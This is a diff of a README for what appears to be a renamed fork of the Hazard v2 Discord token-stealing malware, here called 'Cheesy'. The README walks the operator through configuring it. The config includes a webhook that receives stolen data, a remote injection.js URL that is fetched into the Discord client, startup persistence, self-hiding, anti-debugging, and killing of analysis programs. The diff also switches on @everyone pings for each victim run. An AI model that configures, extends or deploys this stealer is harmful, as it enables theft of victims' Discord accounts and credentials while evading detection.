@@ -75,23 +75,23 @@ If you want to change the config, open up [main.py](https://github.com/bananaman
 ```py
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
+    # Recommend using a webhook protector (when it's fixed)
+    'webhook': "WEBHOOK_HERE", # Enter your webhook on this line by replacing "WEBHOOK_HERE"
+    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING THE TOKEN PROTECTOR # The token protector API I used has been taken off github so use your normal discord webhook for now until I come up with an alternative
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/bananaman2020/Discord-Injection/master/injection.js",
-    # if True, it will ping @everyone when someone ran Hazard v2
-    'ping_on_run': False,
+    # if True, it will ping @everyone when someone ran Cheesy
+    'ping_on_run': True,
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': True,
+    'kill_processes': False,
     # if you want the file to run at startup
     'startup': True,
     # if you want the file to hide itself after run
     'hide_self': True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
-    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
+    # this list of programs will be killed if Cheesy detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
       ...
